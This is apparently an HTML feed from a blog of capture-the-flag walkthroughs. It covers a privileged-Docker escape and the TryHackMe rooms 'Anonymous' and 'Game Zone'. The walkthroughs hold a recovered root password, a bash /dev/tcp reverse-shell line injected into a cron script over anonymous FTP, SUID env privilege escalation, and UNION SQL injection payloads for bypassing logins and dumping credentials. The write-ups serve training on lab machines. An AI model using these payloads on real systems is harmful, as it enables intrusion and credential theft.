&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;privileged&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In short, if a docker container is configured with the &lt;code&gt;--privilaged&lt;/code&gt; flag then this means that any protections afforded to the container, by Docker, are lost and a root user can easily access the host file system. Checking the current mount points:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@gitlab:/opt/backup# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay          18G   12G  5.7G  68% /
tmpfs            64M     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   64M   0% /dev
tmpfs           2.0G     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  2.0G   0% /sys/fs/cgroup
/dev/sda2        18G   12G  5.7G  68% /root_pass
shm              64M  2.3M   62M   4% /dev/shm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This shows that &lt;code&gt;/dev/sda2&lt;/code&gt; maps to the &lt;code&gt;/root_pass&lt;/code&gt; file and, as per the docker compose file, this is used for (likely) initial configuration of the container. The important bit is that it shows the block device the file resides on, meaning that it can quite easily be mounted:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@gitlab:/opt/backup# mkdir /mnt/hdd
root@gitlab:/opt/backup# mount /dev/sda2 /mnt/hdd
root@gitlab:/opt/backup# ls -la /mnt/hdd/root/root.txt
-r-------- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; Jul  &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; root.txt
root@gitlab:/opt/backup#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And with that, access to the root filesystem (along with its associated SSH keys) is granted.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;credentials-store&#34;&gt;Credentials Store&lt;/h1&gt;
&lt;p&gt;Here are a list of credentials obtained during this exercise:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;User&lt;/th&gt;
&lt;th&gt;Password&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;root&lt;/td&gt;
&lt;td&gt;wW59U!ZKMbG9+*#h&lt;/td&gt;
&lt;td&gt;Root password - GitLab Docker container. Obtained via LinPEAS grabbing the &lt;code&gt;smtp_password&lt;/code&gt; value from the gitlab_rails config.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;If you&amp;rsquo;re at least semi-experienced, this box will most likely have been a total cinch for you. I know I didn&amp;rsquo;t really need to do a whole lot of work from start to finish&amp;ndash; frankly, it&amp;rsquo;s one of the easiest boxes in recent memory.&lt;/p&gt;
&lt;p&gt;All that said, there&amp;rsquo;s still a tonne of value in things like this. If you&amp;rsquo;re seasoned, you just got to ensure you&amp;rsquo;ve not just casually forgotten basic things. If you&amp;rsquo;re new to the field, this can easily provide a challenge, especially to those unfamiliar with Docker and its configurations. Let the lesson be: privilaged containers are bad. Until next time!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-5ysk3y&lt;/code&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Anonymous - Linux</title>
      <link>https://5ysk3y.github.io/thm/guides/anonymous/</link>
      <pubDate>Tue, 19 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/thm/guides/anonymous/</guid>
      <description>Overview Welcome to this walkthrough of the TryHackMe room, Anonymous .
This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/anonymous.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Welcome to this walkthrough of the &lt;a href=&#34;https://tryhackme.com&#34; target=&#34;_blank&#34;&gt;TryHackMe&lt;/a&gt;
 room, &lt;a href=&#34;https://tryhackme.com/room/anonymous&#34; target=&#34;_blank&#34;&gt;Anonymous&lt;/a&gt;
.&lt;/p&gt;
&lt;p&gt;This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell. All in all, this is a fun room to accomplish and has touches of OSCP-like concepts.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;As always we begin our enumeration with an NMAP scan. I&amp;rsquo;ve condensed it slightly to lessen the output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;21/tcp  open  ftp         syn-ack vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts [NSE: writeable

22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)

139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;There&amp;rsquo;s two services that peaked my interest off the bat; FTP and SMB. Looking at both, they allow anonymous access. If we check SMB first, we can see a couple of files in a &lt;code&gt;pics&lt;/code&gt; share - downloading them and running them through &lt;code&gt;binwalk&lt;/code&gt; doesn&amp;rsquo;t show any hidden data. For now, we&amp;rsquo;ll assume this is intended as a distraction.&lt;/p&gt;
&lt;p&gt;Turning to FTP, there&amp;rsquo;s a few files we can see through our anonymous login. A shell script, a log file and a text file. The latter txt file outlines how &lt;code&gt;anonymous&lt;/code&gt; access should probably be disabled in the form of a note from the author&amp;ndash; I&amp;rsquo;d agree. The log file we see is exactly that as it contains log entries. Finally we have a shell script called &lt;code&gt;clean.sh&lt;/code&gt; :&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-rwxr-xrwx    1 1000     1000          346 May 19 18:31 clean.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Reading the scripts contents, we can see that this file is responsible for updating the log file we found:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
echo $tmp_files
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Running cleanup script:  nothing to delete&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; LINE in $tmp_files; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
        rm -rf /tmp/$LINE &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;date&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; | Removed file /tmp/&lt;/span&gt;$LINE&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Its a simple if/else statement that executes an echo statment that gets redirected into our log, based on the value of a defined variable. What the script is doing isn&amp;rsquo;t actually the important bit, the important bit is that, as well as read access to the file, also have permission to modify it. Attempts to download the script locally, modify it and re-upload seemingly failed, likely because the re-uploaded file doesn&amp;rsquo;t retain the right user permissions&amp;ndash; by default the file is owned by UID/GID 1000, if we re-upload the file this number changes to something else.&lt;/p&gt;
&lt;p&gt;That said, we can modify files directly on the FTP server. I used &lt;code&gt;lftp&lt;/code&gt; here because I have mad issues with the standard Linux FTP binary if active mode is being used (it&amp;rsquo;s a FW problem I&amp;rsquo;ve not fixed yet):&lt;/p&gt;
&lt;p&gt;&lt;code&gt;lftp anonymous@10.10.210.243:/scripts&amp;gt; edit clean.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This opens the file up in vim &amp;ndash; note this is a local instance of vim, so breaking out of it is going to put you into a shell on your own local machine &amp;ndash; and from there we can edit it. For testing purposes I added a simple cURL command to the bottom of the file:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl 10.11.x.x/test&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Initially I thought things weren&amp;rsquo;t working until suddenly I got this through on my Python listener:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;10.10.210.243 - - [19/May/2020 19:45:03] &amp;quot;GET /test HTTP/1.1&amp;quot; 404 -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now, if we look at the time this occured we can see it was just after the 45th minute of the current hour - I left it and observed to see when, if at all, we got another hit and low and behold:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;10.10.210.243 - - [19/May/2020 19:50:04] &amp;quot;GET /test HTTP/1.1&amp;quot; 404 -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This should make it apparant that there&amp;rsquo;s something (we can assume it is a cron) running this script every 5 minutes. That makes the wait time between changes a bit painful but we have confirmed we can execute code. As I don&amp;rsquo;t trust 99% of rooms to contain a copy of &lt;code&gt;nc&lt;/code&gt; that includes the &lt;code&gt;-e&lt;/code&gt; executable flag, I decided to try a BASH specific method to get a shell, as we&amp;rsquo;re modifying a bash script. This is a method listed under the &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34; target=&#34;_blank&#34;&gt;Pentest Monkey CheatSheet&lt;/a&gt;
:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Replacing this with my relevant IP and a port with an active listener, I waited until I finally got a connection:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc -nlvp 9001
bash: cannot set terminal process group (1451): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ whoami
namelessone
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This gets us some shell access and the user.txt flag.&lt;/p&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Next up, as is standard practice whilst I poke around, I set off &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&#34; target=&#34;_blank&#34;&gt;linPEAS&lt;/a&gt;
 - this actually highlighted our privilage escalation vector. Reading though the output of a completed scan, I could see a particularly interesting binary listed under SUID binaries found on the system:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/bin/env&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This is not a typical SUID binary on a Linux system and having it as one is a good way to allow abuse to occur. If we run the name of this binary, &lt;code&gt;env&lt;/code&gt;, through the ever-popular &lt;a href=&#34;https://gtfobins.github.io/gtfobins/env/&#34; target=&#34;_blank&#34;&gt;GTFOBins&lt;/a&gt;
 we can see that this can be used to gain access to root if the SUID bit is set. To take advantage of this we can run the following from our current user shell:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;namelessone@anonymous:/dev/shm$ /usr/bin/env /bin/sh -p
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Note that unless you have a full TTY you likely won&amp;rsquo;t get any output once you&amp;rsquo;ve elevated to root, but commands will still run. You&amp;rsquo;ll also retain your UID/GID, but the EUID (effective user-ID) will be set to root, which means you&amp;rsquo;re basically root. This will enable you to go and grab the root flag.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;TL;DR - keep it simple and be careful and this room shouldn&amp;rsquo;t give you too much trouble.&lt;/p&gt;
&lt;p&gt;This is a nice little OSCP-like box in terms of the things you have to check, and the room name provides the clue that we get initial access through anonymous logins. It was rated medium - many of the concepts used are basic so I wouldn&amp;rsquo;t personally say it&amp;rsquo;s that hard. It&amp;rsquo;s more about observation and ensuring that you&amp;rsquo;re not digging yourself a grave by, for example, re-uploading a modified file with incorrect permissions.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Game Zone - Linux</title>
      <link>https://5ysk3y.github.io/thm/guides/gamezone/</link>
      <pubDate>Tue, 12 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/thm/guides/gamezone/</guid>
      <description>Overview Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, Gamezone . This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/gamezone.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, &lt;a href=&#34;https://tryhackme.com/room/gamezone&#34; target=&#34;_blank&#34;&gt;Gamezone&lt;/a&gt;
. This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password. From there we use SSH Port Forwarding to gain access to a Webmin service that&amp;rsquo;s locked down, before we use metasploit to compromise that. This was a really fun room so, let&amp;rsquo;s go!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;As is standard, we start off our process with an nmap scan to determine what ports we can listen on:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Apr 26 04:38:10 2020 as: nmap -Pn -sC -sV -oA initial -v 10.10.250.216
Nmap scan report for 10.10.250.216
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 26 04:38:24 2020 -- 1 IP address (1 host up) scanned in 14.22 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;As we can see, there&amp;rsquo;s 2 ports Open:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH (7.2p2)&lt;/li&gt;
&lt;li&gt;Apache (2.4.18)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The main site on port 80 has no associated CMS - it looks bloody old. There&amp;rsquo;s a login form on the left side thats exploitable via cassic SQL injection, a la &lt;code&gt;admin&#39; OR 1=1 -- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This simple injection allows us to bypass the main login, however once we get to the &amp;ldquo;admin panel&amp;rdquo; there&amp;rsquo;s another SQL injectable form in the guise of a search field - passing this to burpsuite, we can start to enumerate number of columns in the table that&amp;rsquo;s being queried by default; we do this by using  &lt;code&gt;ORDER BY&lt;/code&gt;  and we continue to increment its value until we get an error. The following query was the last I submit &lt;em&gt;before&lt;/em&gt; I recieved an error indicating that, in this case, the target table has 3 colums:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; ORDER BY 3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now we have this information we can then use &lt;code&gt;union&lt;/code&gt; to confirm we can inject information onto the page:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,2,3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This produces &amp;ldquo;1,2,3&amp;rdquo; on the page and we can hijack one of these and replace it with a nested SQL statement or, to test, a string:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,&amp;quot;5ysk3y&amp;quot;,3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This renders the word &lt;code&gt;5ysk3y&lt;/code&gt; on the page in place of the second colmn - if we replace that second value with a mySQL function instead, like &lt;code&gt;user()&lt;/code&gt;, we get &lt;code&gt;root@localhost&lt;/code&gt; printed on the page. So we can now start to enumerate stuff as we can get the page to output it.&lt;/p&gt;
&lt;p&gt;As the room asks us to use SQLMap, I&amp;rsquo;ll set that off while I manually exploit this in tandem. The SQLMap command I used is:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r $(pwd)/search.req --technique=U --batch&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;N.B. As we know its UNION injectable, specifying &lt;code&gt;U&lt;/code&gt; as the technique allows us to target that specifically.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;To manually exploit this we can reference the &lt;code&gt;INFORMATION SCHEMA&lt;/code&gt; database in MySQL - this contains stuff that MySQL itself uses to keep things in order, e.g. other database names as well as tonnes of related data - the &lt;code&gt;SCHEMATA&lt;/code&gt; table specifically contains the names of databases MySQL knows about. The following query would extract those:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As mentioned, to run another query as part of the union it needs to be &lt;code&gt;(nested)&lt;/code&gt; and, in order to view everything that matches our query (as there&amp;rsquo;s more than one value returned in the output) we wrap the target table in the group_concat() function. This gets us the following output on the page in place of the second column:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;information_schema, db, mysql, performance_schema, sys&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The schema/sys/mysql databases belong to MySQL, the &lt;code&gt;db&lt;/code&gt; database seems like it will contain data we may want.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/schemata-table.html&#34; target=&#34;_blank&#34;&gt;This&lt;/a&gt;
 is a particularly good reference for finding out what tables within INFORMATION_SCHEMA you can query to get information about other DB&amp;rsquo;s to use for further queries/enumeration.&lt;/p&gt;
&lt;p&gt;As we now have a database to target we can query the names of the tables within that database:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = &#39;db&#39;),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which gives us the name of the two tables inside this database:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Posts, Users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;From there we can start to enumerate the columns within those tables. In this case, I focused on the user table as it&amp;rsquo;s the most interesting:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &#39;users&#39;),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This shows the following columns:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;username, pwd, USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which means we can now do some more useful queries, such as:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select username from db.users),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which gets us a username:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;agent47&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And we can also query the password as well:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select pwd from db.users),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which gets us a hash (this is an incomplete version; you&amp;rsquo;ll need to grab it yourself):&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ab5db915fc9cea6c78df88106c6500-[truncated]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We could have also got this via SQLMap by including &lt;code&gt;--dump&lt;/code&gt; in our earlier command, but that&amp;rsquo;s less fun. Also, SQLMap did confirm our original suspicions that this was UNION injectable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;sqlmap resumed the following injection point(s) &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; stored &lt;span style=&#34;color:#66d9ef&#34;&gt;session&lt;/span&gt;:
&lt;span style=&#34;color:#75715e&#34;&gt;---
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Parameter&lt;/span&gt;: searchitem (POST)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;UNION&lt;/span&gt; query
    Title: Generic &lt;span style=&#34;color:#66d9ef&#34;&gt;UNION&lt;/span&gt; query (&lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; columns
    Payload: searchitem&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;test&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7171,0x654a55516342637965547842506b644e7a43565354614c63756f4368676e70434165736969574c4a,0x7162716a71)-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Before moving on we must crack that hash to get our user password. I used John for this, although online tools exist to allow you to reverse it that way if you don&amp;rsquo;t have the facility to crack stuff. Due to THM guide rules, I&amp;rsquo;m not able to include this but, that said, aquiring it isn&amp;rsquo;t all that difficult once you have the hash.&lt;/p&gt;
&lt;p&gt;Success! We get a password. Using the login combination of &lt;code&gt;agent47:&amp;lt;REDACTED&amp;gt;&lt;/code&gt; we can now SSH into the machine and get our user flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Once on the box, we would traditionally enumerate but this is a guided experience so lets stick with the beaten path; running &lt;code&gt;ss&lt;/code&gt; to get a list of listening ports on the box, we see one that stands out due to its number as well as the fact that it didn&amp;rsquo;t appear on our nmap scan:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q           Local Address:Port                  Peer Address:Port
udp   UNCONN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                *:10000                             *:*
udp   UNCONN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                *:68                                *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;                127.0.0.1:3306                      *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              *:10000                             *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              *:22                                *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              :::80                               :::*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              :::22                               :::*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And this is a table to outline what the arguments denote:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/gamezone-ss.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;Port 22, 80 and 3306 we can rule out as we know what they are - port 10000, on the other hand, is a little unconventional.&lt;/p&gt;
&lt;p&gt;It doesn&amp;rsquo;t show up on a full port scan so we can assume the firewall is blocking us. We can&amp;rsquo;t quite confirm just yet but it seems likely:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;agent47@gamezone:~$ cat /etc/iptables/rules.v4
cat: /etc/iptables/rules.v4: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In order to look into this service, we need to use a &lt;em&gt;local&lt;/em&gt; tunnel via SSH to forward the port from the remote box, back to us, so that it&amp;rsquo;s accessible. In order to do this we can run the following command:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# ssh -L 10000:127.0.0.1:10000 -f -N agent47@10.10.148.87
agent47@10.10.148.87&#39;s password:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;-f&lt;/code&gt; flag tells the connection to run in the background, and the &lt;code&gt;-N&lt;/code&gt; flag is required with that to tell SSH that no command execution is required (as it is typically expected).&lt;/p&gt;
